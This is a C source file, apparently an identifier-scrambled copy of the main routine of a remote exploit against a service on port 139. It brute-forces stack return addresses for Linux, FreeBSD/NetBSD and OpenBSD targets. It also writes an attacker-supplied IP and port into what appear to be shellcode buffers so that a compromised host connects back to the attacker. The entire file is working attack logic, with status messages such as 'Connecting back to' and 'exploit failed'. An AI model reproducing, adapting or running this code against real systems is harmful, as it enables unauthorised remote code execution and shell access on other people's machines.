
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int dummy; } ;
struct sockaddr_in {int sin_addr; void* sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int addr1 ;
typedef void* a_port ;


 int VAR_0 ;
 int VAR_1 ;
 scalar_t__ VAR_2 ;
 scalar_t__ VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (char*) ;
 char* VAR_5 ;
 int* VAR_6 ;
 int VAR_7 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int,unsigned long,char*) ;
 int FUNC_5 (int,unsigned long,char*) ;
 scalar_t__ VAR_8 ;
 int FUNC_6 () ;
 int FUNC_7 (int ,char*,...) ;
 struct hostent* FUNC_8 (char*) ;
 scalar_t__ FUNC_9 () ;
 void* FUNC_10 (int) ;
 scalar_t__ FUNC_11 (int ) ;
 int FUNC_12 (scalar_t__,scalar_t__) ;
 char* VAR_9 ;
 scalar_t__ VAR_10 ;
 int FUNC_13 (int *,int ,int ) ;
 int VAR_11 ;
 int FUNC_14 (scalar_t__,int ) ;
 int FUNC_15 (int) ;
 int VAR_12 ;
 int FUNC_16 (int ,int ,int) ;
 int FUNC_17 (char*,char*,int*,int*,int*,int*) ;
 int FUNC_18 () ;
 int FUNC_19 (int) ;
 int FUNC_20 (char*,struct stat*) ;
 int VAR_13 ;
 int VAR_14 ;
 int FUNC_21 (char*) ;
 int FUNC_22 (int) ;
 int FUNC_23 (int*) ;

int
FUNC_24 (int VAR_15,char *VAR_16[])
{
   char *VAR_17 = ((void*)0);
   int VAR_18 = -1;
   int VAR_19 = 139;
   int VAR_20 = 0;
   int VAR_21 = 0;
   int VAR_22 = 0;
   int VAR_23 = 0;
   int VAR_24 = 0;
   int VAR_25 = 0;
   int VAR_26 = 0;
   int VAR_27 = 0;
   int VAR_28 = 0;
   int VAR_29 = 512;
   int VAR_30 = 64;
   char *VAR_31;
   unsigned long VAR_32 = 40;
   unsigned long VAR_33 = 0x0;
   unsigned short int VAR_34;
   struct sockaddr_in VAR_35;
   struct hostent *VAR_36;
   struct stat VAR_37;

      if (VAR_15 != 4) FUNC_21(VAR_16[0]);

      VAR_18 = FUNC_0(VAR_16[1]);
      if (VAR_18 > 3) {
          FUNC_7(VAR_14, "Os type out of list!\n");
          FUNC_3(1);
      }

      VAR_36 = FUNC_8(VAR_16[2]);

      if (VAR_36 == ((void*)0)) {
          FUNC_7(VAR_13, "Unable to resolve\n");
          return -1;
      }

      VAR_10 = FUNC_9();
      FUNC_18();
      VAR_8 = VAR_10 + 1;



      FUNC_17(VAR_16[3], "%d.%d.%d.%d", &VAR_24, &VAR_25, &VAR_26, &VAR_27);
      VAR_9[171] = VAR_24; VAR_5[162] = VAR_24;
      VAR_9[172] = VAR_25; VAR_5[163] = VAR_25;
      VAR_9[173] = VAR_26; VAR_5[164] = VAR_26;
      VAR_9[174] = VAR_27; VAR_5[165] = VAR_27;

      FUNC_7(VAR_14, "[+] Connecting back to: [%d.%d.%d.%d:%d]\n",
     VAR_24, VAR_25, VAR_26, VAR_27, VAR_11);

      VAR_34 = FUNC_10(VAR_11);

      VAR_9[177]= (VAR_34) & 0xff;
      VAR_9[178]= (VAR_34 >> 8) & 0xff;
      VAR_5[168]= (VAR_34) & 0xff;
      VAR_5[169]= (VAR_34 >> 8) & 0xff;

      switch(VAR_18) {
      case 0:
              VAR_31 = "Linux";
              VAR_33 = 0xc0000000;
              VAR_17 = VAR_9;
              break;
      case 1:
              VAR_31 = "FreeBSD/NetBSD";
              VAR_33 = 0xbfc00000;
              VAR_17 = VAR_5;
              break;
      case 2:
              VAR_31 = "OpenBSD 3.1 and prior";
              VAR_33 = 0xdfc00000;
              VAR_17 = VAR_5;
              break;
      case 3:
              VAR_31 = "OpenBSD 3.2 non-exec stack";
              VAR_33 = 0x00170000;
              VAR_17 = VAR_5;
              break;
      }

      FUNC_7(VAR_14, "[+] Target: %s\n", VAR_31);
      FUNC_13(&VAR_35, VAR_36->h_addr, VAR_36->h_length);

      VAR_35 = VAR_0;
      VAR_35 = FUNC_10(VAR_19);

      FUNC_7(VAR_14, "[+] Connected to [%s:%d]\n", (char *)FUNC_11(VAR_35), VAR_19);
      FUNC_7(VAR_14, "[+] Please wait in seconds...!\n");

      FUNC_14(VAR_3, VAR_1);

      for (VAR_21 = 0; VAR_21 < 50; VAR_21++) VAR_6[VAR_21] = -1;
      VAR_21 = 0; VAR_23 = 0;

      while (VAR_2) {

           if ((VAR_20 = FUNC_16(VAR_0, VAR_4, 6)) < 0) {
              FUNC_7(VAR_13, "[+] socket() error.\n");
              FUNC_3(-1);
           }

           VAR_33 -= VAR_29; VAR_21++;
           if ((VAR_33 & 0xff) == 0x00 && VAR_18 != 3) VAR_33++;

           VAR_23++;



           FUNC_22(150000);

           switch (VAR_6[VAR_21] = FUNC_6()) {
           case 0:
                  if (FUNC_2(VAR_20, (struct sockaddr *)&VAR_35, sizeof(VAR_35)) == -1) {

                      FUNC_1(VAR_20);
                      FUNC_3(-1);
                  }

                 FUNC_19(VAR_20);
                 FUNC_15(3);

                 if (VAR_18 != 3) {
                           if (FUNC_4(VAR_20, VAR_33, VAR_17) < 0) {

                              FUNC_1(VAR_20);
                              FUNC_3(-1);
                           }
                 } else {
                           if (FUNC_5(VAR_20, VAR_33, VAR_17) < 0) {

                              FUNC_1(VAR_20);
                              FUNC_3(-1);
                           }
                  }
                  FUNC_15(5);
                  FUNC_1(VAR_20);
                  FUNC_3(0);
                  break;
           case -1:
                  FUNC_3(-1);
                  break;
           default:
                  if (VAR_21 > VAR_32 - 2) {
                      FUNC_23(&VAR_22);
                      VAR_21--;
                  }
                  break;
           }

           if (VAR_23 == VAR_30) VAR_2 = 0;
      }

      if (FUNC_20(".ROOT", &VAR_37) != -1)
         FUNC_12(VAR_3, VAR_10);
      else {
           FUNC_7(VAR_14, "[+] Dohh, exploit failed.\n");
    FUNC_1(VAR_7); FUNC_1(VAR_12);
           FUNC_12(VAR_10, VAR_3);
    FUNC_15(2);
    FUNC_3(0);
      }
}
